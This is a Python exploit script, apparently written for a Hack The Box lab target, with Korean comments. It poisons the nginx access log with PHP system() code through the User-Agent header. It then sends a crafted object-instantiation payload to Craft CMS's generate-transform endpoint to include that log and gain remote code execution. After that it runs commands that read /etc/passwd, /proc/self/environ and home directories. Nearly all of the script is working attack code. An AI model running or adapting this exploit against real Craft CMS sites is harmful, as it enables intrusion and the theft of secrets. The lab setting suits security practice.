#!/usr/bin/env python3
import socket, sys, re, json, time
import requests, urllib3

urllib3.disable_warnings()
TARGET_IP = "10.129.244.146"
_orig = socket.getaddrinfo
def p(h, *a, **kw):
    return _orig(TARGET_IP if h == "orion.htb" else h, *a, **kw)
socket.getaddrinfo = p

TARGET = "http://orion.htb"
s = requests.Session()
s.verify = False

def write_file(cmd, outfile="/tmp/rce_out.txt"):
    """명령 실행 결과를 파일에 저장"""
    csrf_r = s.get(f"{TARGET}/actions/users/session-info", headers={"Accept": "application/json"})
    csrf = csrf_r.json()["csrfTokenValue"]

    # system 출력을 파일에 저장
    php = f"<?php system('{cmd} > {outfile} 2>&1'); ?>"
    print(f"[*] Writing output to {outfile}", file=sys.stderr)
    s.get(f"{TARGET}/", headers={"User-Agent": php})
    time.sleep(0.5)

    payload = {
        "assetId": 2,
        "handle": {"width": 1, "height": 1,
            "as hack": {
                "class": "craft\\behaviors\\FieldLayoutBehavior",
                "__class": "yii\\rbac\\PhpManager",
                "__construct()": [{"itemFile": "/var/log/nginx/access.log"}],
            },
        },
    }
    r = s.post(f"{TARGET}/actions/assets/generate-transform",
               data=json.dumps(payload),
               headers={"Content-Type": "application/json", "X-CSRF-Token": csrf})

    time.sleep(0.3)
    return outfile

def read_web_file(path):
    """웹으로 접근 가능한 경로에서 읽기"""
    r = s.get(f"{TARGET}{path}")
    return r.text

# 실행
write_file("ls -la /home", "/tmp/home_ls.txt")
write_file("find /home -name '*.txt' -o -name '*.md' 2>/dev/null", "/tmp/find_txt.txt")
write_file("id", "/tmp/id_out.txt")
write_file("cat /etc/passwd | head -20", "/tmp/passwd.txt")
write_file("cat /proc/self/environ | tr '\\0' '\\n'", "/tmp/env.txt")

# /tmp 에서 읽기 시도
for path in ["/tmp/home_ls.txt", "/tmp/find_txt.txt", "/tmp/id_out.txt", "/tmp/passwd.txt", "/tmp/env.txt"]:
    print(f"\n=== {path} ===")
    try:
        out = read_web_file(path)
        print(out[:1000])
    except Exception as e:
        print(f"Error: {e}")
